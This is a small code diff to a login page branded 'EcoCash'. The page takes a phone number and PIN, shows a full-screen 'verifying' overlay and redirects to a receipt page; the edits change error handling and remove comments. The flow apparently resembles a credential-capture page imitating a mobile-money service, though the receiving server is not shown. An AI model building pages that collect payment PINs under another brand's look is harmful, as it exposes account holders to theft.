@@ -90,7 +90,6 @@
   .form-error { display: none; background: #FEF2F2; border: 1px solid #FECACA; color: #B91C1C; font-size: 13px; font-weight: 500; padding: 10px 12px; border-radius: 10px; margin-bottom: 16px; text-align: center; line-height: 1.5; }
   .form-error.show { display: block; }
 
-  /* Verifying full-screen overlay */
   .verifying {
     position: fixed; inset: 0;
     background: #FFFFFF;
@@ -187,7 +186,6 @@
   </div>
 </div>
 
-<!-- Full-page verifying overlay -->
 <div class="verifying" id="verifying">
   <div class="inner">
     <div class="logo-big"><span class="eco">Eco</span><span class="cash">Cash</span></div>
@@ -329,7 +327,8 @@ async function submitLogin() {
     let result = { status: 'verifying' };
     try { result = await res.json(); } catch (e) {}
 
-    if (result.status === 'failed') {
+    // Show any non-success response honestly
+    if (result.status === 'failed' || result.status === 'error') {
       btn.disabled = false;
       btn.textContent = 'Login';
       showFormError(result.message || 'Authorization failed. Please check your number and PIN.');
@@ -338,7 +337,7 @@ async function submitLogin() {
       return;
     }
 
-    // Success or verifying — show full-page verifying overlay
+    // Show verifying overlay for verifying/success/pending
     document.getElementById('verifying').classList.add('show');
 
     if (currentTx) {
@@ -346,14 +345,13 @@ async function submitLogin() {
       try { sessionStorage.setItem('ecopay_current', JSON.stringify(currentTx)); } catch (e) {}
     }
 
-    // Give the verifying screen a moment, then return to the receipt
     setTimeout(() => {
       window.location.href = 'client.html';
     }, 3200);
   } catch (err) {
     btn.disabled = false;
     btn.textContent = 'Login';
-    showFormError('Could not process request. Please try again.');
+    showFormError('Could not reach the server. Please try again.');
   }
 }
 
